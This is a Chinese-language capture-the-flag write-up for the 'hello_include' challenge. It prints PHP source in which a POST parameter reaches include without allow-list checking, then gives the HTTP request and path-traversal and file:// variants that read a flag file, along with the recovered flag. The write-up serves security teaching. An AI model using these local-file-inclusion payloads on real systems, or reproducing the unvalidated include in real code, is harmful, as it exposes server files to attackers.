# hello_include

## 题目简述

站点公开了 `index.phps`，其中存在用户可控的 `include`。代码声明了允许文件列表却从未使用，只禁止参数中出现 `php://`；同时 `phpinfo.php` 泄露了 flag 的绝对路径。因此可直接让 PHP 包含该文本文件并回显内容。

## 解题过程

访问 `/index.phps` 得到核心源码：

```php
$allowed = ['hello.php', 'phpinfo.php'];
if (isset($_POST['f1Ie'])) {
    if (strpos($_POST['f1Ie'], 'php://') !== false) {
        die('不允许php://');
    }
    include $_POST['f1Ie'];
} else {
    include 'hello.php';
}
```

`$allowed` 没有参与任何判断，`f1Ie` 可以是任意本地路径。访问 `/phpinfo.php` 后，在环境变量中可见：

```text
flag_0xgame_position=/s3cr3t/f14g
```

提交该绝对路径即可：

```http
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 18

f1Ie=/s3cr3t/f14g
```

`include` 找到 `/s3cr3t/f14g` 后会把其中不在 PHP 标签内的文本直接输出，响应为：

```text
0xgame{4fdbe53f-53c0-4b04-966a-13fd3c9b9f2e}
```

也可以使用相对于 `/var/www/html` 的 `../../../s3cr3t/f14g`，或使用未被过滤的 `file:///s3cr3t/f14g`；不过绝对路径最直接。

## 方法总结

漏洞的根因是把未经白名单校验的 POST 参数传给 `include`。解题时先通过源代码泄露确认参数，再从 `phpinfo` 获取目标路径，最后进行本地文件包含；`php://` 黑名单并不能阻止普通绝对路径、目录穿越或其他包装器。
